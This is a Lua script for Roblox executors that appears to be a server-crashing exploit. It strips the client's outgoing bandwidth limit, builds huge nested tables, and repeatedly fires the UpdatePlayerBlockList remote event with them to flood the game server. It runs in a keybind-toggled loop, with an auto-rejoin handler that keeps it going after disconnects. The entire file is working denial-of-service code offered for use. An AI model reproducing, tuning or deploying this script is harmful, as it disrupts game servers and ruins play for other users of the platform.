--// Obsoleted by 2.4X (obfuscated and paid) and this is just a v3rm script but improved \\--

repeat wait() until game.CoreGui:FindFirstChild("RobloxPromptGui")
local lp, po, ts =
      game:GetService("Players").LocalPlayer,
      game.CoreGui.RobloxPromptGui.promptOverlay,
      game:GetService("TeleportService")
po.ChildAdded:connect(
  function(a)
	if a.Name == "ErrorPrompt" then
		  repeat
			    execCmd("rejoin");
			    wait(10)
			    ts:Teleport(game.PlaceId)
			    wait(2)
		  until false
	end
end)

--// the main code... \\--
getgenv().Toggled = false
getgenv().KeyBind = "C"
getgenv().Delay = 0.7
local UIS = game:GetService'UserInputService'
local function Source()
	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
  
	local function getmaxvalue(val)
		local mainvalueifonetable = 49999
		if type(val) ~= "number" then
			return nil
		end
		local calculateperfectval = (mainvalueifonetable / (val + 2))
		return calculateperfectval
	end
  
	local function bomb(tableincrease, tries)
		local maintable = {}
		local spammedtable = {}
		table.insert(spammedtable, {})
		z = spammedtable[1]
		for i = 1, tableincrease do
			local tableins = {}
			table.insert(z, tableins)
			z = tableins
		end
		local calculatemax = getmaxvalue(tableincrease)
		local maximum
		if calculatemax then
			maximum = calculatemax
		else
			maximum = 10000
		end
		for i = 1, maximum do
			table.insert(maintable, spammedtable)
		end
		if calculatemax then
			maximum = calculatemax
		else
			maximum = 10000
		end
		for i = 1, maximum do
			table.insert(maintable, spammedtable)
		end
		for i = 1, tries do
			game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
		end
	end
	bomb(250, 2) --// change values if client crashes
end
UIS.InputBegan:Connect(function(Key)
	if Key.KeyCode == Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
		if getgenv().Toggled then
			getgenv().Toggled = false
			warn'Disabled!'
		elseif not getgenv().Toggled then
			getgenv().Toggled = true
			warn'Enabled!'
			while getgenv().Toggled do
				Source()
				wait(getgenv().Delay)
			end
		end
	end
end)
